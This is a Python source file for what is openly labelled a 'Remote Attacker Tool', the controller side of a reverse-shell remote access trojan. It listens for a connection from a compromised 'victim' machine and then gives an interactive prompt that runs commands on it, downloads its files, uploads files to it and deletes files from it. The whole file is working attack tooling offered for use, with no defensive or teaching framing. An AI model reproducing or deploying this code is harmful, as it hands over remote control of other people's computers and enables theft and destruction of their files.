import socket
import json
import base64
import argparse
from colorama import Fore, init  # color text
init(autoreset=True)


text = """
𝕖𝕧𝕖𝕣𝕪𝕥𝕙𝕚𝕟𝕘 
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗██╗░░██╗██╗░░██╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██║░██╔╝██║░██╔╝
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░█████═╝░█████═╝░
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░██╔═██╗░██╔═██╗░
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗██║░╚██╗██║░╚██╗
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
    """
print(Fore.LIGHTRED_EX + text)
print(Fore.LIGHTYELLOW_EX + "    # everythingBlackkk , Coded By Yassin Abd-elrazik ")
print(Fore.LIGHTYELLOW_EX + "          GitHub : everythingBlackkk")

def run_attacker(victim_ip, victim_port):
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    attacker_socket.bind((victim_ip, victim_port))
    attacker_socket.listen(0)
    print("[+] Waiting For Connection...")
    victim_connection, victim_ip = attacker_socket.accept()
    print("[+] Connection Successful with " + str(victim_ip))


    def send_safe(data):
        json_data = json.dumps(data)
        victim_connection.send(json_data.encode())

    def receive_safe():
        json_data = ""
        while True:
            try:
                json_data += victim_connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command_on_victim(command):
        send_safe(command)
        if command[0] == "exit":
            victim_connection.close()
            print("exit...")
            exit()
        if command[0] == "download" or command[0] == "dw":
            return receive_file_safe()
        else:
            return receive_safe()

    def receive_file_safe():
        file_data = b""
        while True:
            chunk = victim_connection.recv(1024)
            if chunk.endswith(b"END_OF_FILE"):
                file_data += chunk[:-11]
                break
            file_data += chunk
        return file_data

    def write_file_to_disk(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download is successful"

    def read_file_from_disk(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def delete_file(path):
        command = ["delete", path]
        result = execute_command_on_victim(command)
        return result

    while True:
        command = input(">> ")
        command = command.split(" ")
        if command[0] == "upload":
            file_content = read_file_from_disk(command[1])
            command.append(file_content.decode())
        elif command[0] == "delete":
            result = delete_file(command[1])
            print(result)
            continue

        victim_result = execute_command_on_victim(command)
        if command[0] == "download" or command[0] == "dw":
            write_file_to_disk(command[1], victim_result)
        else:
            print(victim_result)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Remote Attacker Tool")
    parser.add_argument("-ip", "--victim_ip", type=str, help="IP address of the victim")
    parser.add_argument("-p", "--victim_port", type=int, help="Port number of the victim")
    args = parser.parse_args()

    if not args.victim_ip or not args.victim_port:
        print("[-] Please provide both -ip and -p arguments.")
    else:
        run_attacker(args.victim_ip, args.victim_port)
